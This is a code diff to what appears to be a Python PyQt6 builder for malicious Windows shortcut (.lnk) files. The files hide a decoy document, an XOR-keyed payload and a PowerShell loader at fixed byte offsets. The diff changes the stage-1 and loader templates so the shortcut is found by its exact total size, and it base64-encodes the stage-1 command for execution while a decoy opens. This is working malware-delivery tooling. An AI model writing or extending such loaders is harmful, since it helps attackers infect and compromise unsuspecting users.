@@ -13,7 +13,7 @@ from PyQt6.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLay
 from PyQt6.QtCore import QObject, Qt
 from PyQt6.QtGui import QIcon, QAction, QPixmap
 
-loader_template = '''$filename = Get-ChildItem *.lnk | Where-Object {$_.Length -gt 51200} | Select-Object -ExpandProperty Name;
+loader_template = '''$filename = $env:lnkfilename;
 $key = [System.Text.Encoding]::UTF8.GetBytes('#replacemexorkey')[0];
 
 $decoy_start_byte = 0x00003000;
@@ -107,7 +107,8 @@ Invoke-Item $decoy_file;
 
 stage1_command_template = '''$script_start_byte = #replacemeloaderstartbyte
 $script_length = #replacemescriptlength;
-$filename = Get-ChildItem *.lnk | Where-Object {$_.Length -gt 51200} | Select-Object -ExpandProperty Name;
+$filename = Get-ChildItem *.lnk | Where-Object {$_.Length -eq #replacemetotallnkfilesize} | Select-Object -ExpandProperty Name;
+$env:lnkfilename = $filename;
 
 if (-not(Test-Path $filename))
 {
@@ -581,6 +582,7 @@ class MainWindow(QWidget):
             lnkfilesize = 0x00003000 + decoysize + 1 + payloadsize + 1 + script_length
             if payload_type == "PowerShell Script":
                 lnkfilesize = 0x00003000 + decoysize + 1 + script_length
+            totallnkfilesize = int(lnkfilesize)
             units = ["B", "KB", "MB", "GB"]
             index = 0
             while lnkfilesize >= 1024 and index < len(units) - 1:
@@ -590,6 +592,7 @@ class MainWindow(QWidget):
             self.console.append(f"[*] Success! Stage 2 Loader saved! Size: {script_length} bytes")
             self.console.append("[*] Generating Stage 1")
             stage1_command_template = stage1_command_template.replace('#replacemescriptlength', str(script_length))
+            stage1_command_template = stage1_command_template.replace('#replacemetotallnkfilesize', str(totallnkfilesize))
             stage1_command_template = stage1_command_template.replace('#replacemeloaderstartbyte', f'0x{loader_start_byte:08x}')
             stage1_utf16le_content = stage1_command_template.encode('utf-16le')
             stage1base64_encoded = base64.b64encode(stage1_utf16le_content)
